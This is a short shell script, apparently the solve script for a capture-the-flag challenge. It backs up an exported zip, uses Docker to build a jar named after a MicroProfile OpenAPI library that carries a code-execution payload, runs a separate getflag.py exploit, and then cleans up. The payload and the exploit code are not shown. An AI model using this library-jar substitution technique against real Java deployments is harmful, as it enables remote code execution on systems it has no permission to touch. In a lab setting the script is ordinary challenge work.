#!/usr/bin/env sh

set -euo pipefail

# Backup clean exported.zip
cp exported.zip exported.zip.bak

# Let's create the jar-file already, so we don't have to deal with docker permission issues
JAR_NAME="org.eclipse.microprofile.openapi.microprofile-openapi-api-4.0.2.jar"
touch $JAR_NAME

# Craft jar that includes code execution payload
CONTAINER_NAME="craft_jar_payload"
sudo docker build -t $CONTAINER_NAME .
sudo docker run -it --rm -v ./:/deployments/lib/main/out $CONTAINER_NAME

# Run exploit script that will get the flag
python3 getflag.py

# Cleanup 
rm $JAR_NAME
mv exported.zip.bak exported.zip